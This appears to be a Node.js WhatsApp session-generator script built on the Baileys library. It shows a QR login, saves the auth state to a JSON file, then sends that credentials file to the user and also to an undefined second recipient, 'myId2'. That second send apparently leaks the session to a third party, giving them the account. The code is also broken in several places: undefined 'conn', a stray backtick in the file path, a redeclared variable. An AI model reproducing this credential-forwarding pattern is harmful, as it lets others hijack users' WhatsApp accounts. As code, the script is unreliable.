const makeWASocket = require("@adiwajshing/baileys").default
const qrcode = require("qrcode-terminal")
const fs = require('fs')
const pino = require('pino')
const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
const { state, saveState } = useSingleFileAuthState('./session.alfa.json')
const { exec, spawn, execSync } = require("child_process")
exec('rm -rf session.tokio.json')


  function qr() {
//------------------------------------------------------
    let version = [3,3234,9]
    const session = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: ['Alien-Alfa','opera','1.0.0'],
        auth: state,
        version
    })
//------------------------------------------------------
    session.ev.on("connection.update",async  (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
            await delay(1000 * 10);
  const session = fs.readFileSync("./session.alfa.json`");
   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `session.alfa.json` })
	 await conn.sendMessage(myId2, { document: session, mimetype: 'application/json', fileName: `session.alfa.json` })
            process.exit(0)
        }
        if (
            connection === "close" &&
            lastDisconnect &&
            lastDisconnect.error &&
            lastDisconnect.error.output.statusCode != 401
        ) {
            qr()
        }
    })
    session.ev.on('creds.update', saveState)
    session.ev.on("messages.upsert",  () => { })
}
qr()
